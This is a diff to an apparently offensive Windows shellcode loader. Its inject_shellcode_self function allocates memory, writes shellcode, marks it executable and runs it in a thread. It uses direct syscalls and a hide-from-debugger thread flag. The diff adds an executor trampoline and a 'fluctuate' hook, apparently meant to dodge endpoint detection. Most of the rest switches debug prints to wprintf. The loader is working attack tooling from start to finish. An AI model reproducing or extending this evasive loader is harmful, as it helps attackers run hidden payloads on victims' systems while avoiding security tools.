@@ -68,10 +68,14 @@ void my_init_syscalls_list(void) {
     #endif
 }
 
+void executor(void (*shellcode)(void)) {
+    (*shellcode)();
+}
+
 LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
     #ifdef _DEBUG_
         if (sleep_time > 0)
-            printf("sleeping for %d seconds!\n", sleep_time);
+            wprintf(L"sleeping for %d seconds!\n", sleep_time);
     #endif
     #ifdef SYSCALLS
         NTSTATUS status = STATUS_PENDING;
@@ -80,12 +84,16 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
         status = INLINE_SYSCALL(NtDelayExecution)(TRUE, &li_sleep_time);
         if (NT_FAIL(status)) {
             #ifdef _DEBUG_
-                printf("ERROR: NtDelayExecution = 0x%x\n", status);
+                wprintf(L"ERROR: NtDelayExecution = 0x%x\n", status);
             #endif
             return NULL;
         }
     #else
         Sleep(sleep_time);
+    #endif
+
+    #ifdef FLUCTUATE
+        fluctuate();
     #endif
 
     #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
@@ -95,9 +103,9 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
         #ifdef _DEBUG_
             puts("self executing the payload in .text");
         #endif
-        return (*func)();
+        return executor(func);
     #else
-        void *allocation = nullptr;
+        void* allocation = nullptr;
         #ifdef SYSCALLS
             status = INLINE_SYSCALL(NtAllocateVirtualMemory)(
                 (HANDLE)-1,
@@ -113,7 +121,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             if (NT_FAIL(status) || !allocation)
             {
                 #ifdef _DEBUG_
-                printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
+                wprintf(L"ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                 #endif
                 return NULL;
             }
@@ -131,14 +139,14 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             if (!allocation)
             {
                 #ifdef _DEBUG_
-                printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
+                wprintf(L"ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                 #endif
                 return NULL;
             }
         #endif
 
         #ifdef _DEBUG_
-            printf("Allocated rwx memory @ 0x%x\n", allocation);
+            wprintf(L"Allocated rwx memory @ 0x%x\n", allocation);
         #endif
 
         SIZE_T bytesWritten = 0;
@@ -154,7 +162,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             if (NT_FAIL(status) || bytesWritten < size)
             {
                 #ifdef _DEBUG_
-                printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
+                wprintf(L"ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                 #endif
                 return NULL;
             }
@@ -168,14 +176,14 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
 
             if (!res) {
                 #ifdef _DEBUG_
-                printf("ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
+                wprintf(L"ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
                 #endif
                 return NULL;
             }
         #endif
 
         #ifdef _DEBUG_
-            printf("Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
+            wprintf(L"Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
         #endif
 
         #ifdef RX
@@ -191,7 +199,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             if (NT_FAIL(status) || old == 0)
             {
                 #ifdef _DEBUG_
-                printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
+                wprintf(L"ERROR: NtProtectVirtualMemory = 0x%x\n", status);
                 #endif
                 return NULL;
             }
@@ -205,7 +213,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
 
             if (!res) {
                 #ifdef _DEBUG_
-                printf("ERROR: VirtualProtectEx = 0x%x\n", GetLastError());
+                wprintf(L"ERROR: VirtualProtectEx = 0x%x\n", GetLastError());
                 #endif
                 return NULL;
             }
@@ -226,7 +234,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
                 THREAD_ALL_ACCESS,
                 nullptr,
                 (HANDLE)-1,
-                allocation,
+                executor,
                 allocation,
                 THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                 0,
@@ -237,7 +245,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             if (NT_FAIL(status) || !*phThread)
             {
                 #ifdef _DEBUG_
-                printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
+                wprintf(L"ERROR: NtCreateThreadEx = 0x%x\n", status);
                 #endif
                 return NULL;
             }
@@ -246,7 +254,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
                 (HANDLE)-1,
                 NULL,
                 0,
-                (LPTHREAD_START_ROUTINE)allocation,
+                (LPTHREAD_START_ROUTINE)executor,
                 allocation,
                 NULL,
                 NULL
@@ -254,19 +262,19 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
 
             if (!*phThread) {
                 #ifdef _DEBUG_
-                printf("ERROR: CreateRemoteThread = 0x%x\n", GetLastError());
+                wprintf(L"ERROR: CreateRemoteThread = 0x%x\n", GetLastError());
                 #endif
                 return NULL;
             }
         #endif
 
         #ifdef _DEBUG_
-            printf("Created thread #%d\n", *phThread);
+            wprintf(L"Created thread #%d\n", *phThread);
         #endif
 
         if (wait) {
             #ifdef _DEBUG_
-                printf("Waiting for thread #%d\n", *phThread);
+                wprintf(L"Waiting for thread #%d\n", *phThread);
             #endif
             #ifdef SYSCALLS
                 INLINE_SYSCALL(NtWaitForSingleObject)(*phThread, TRUE, NULL);
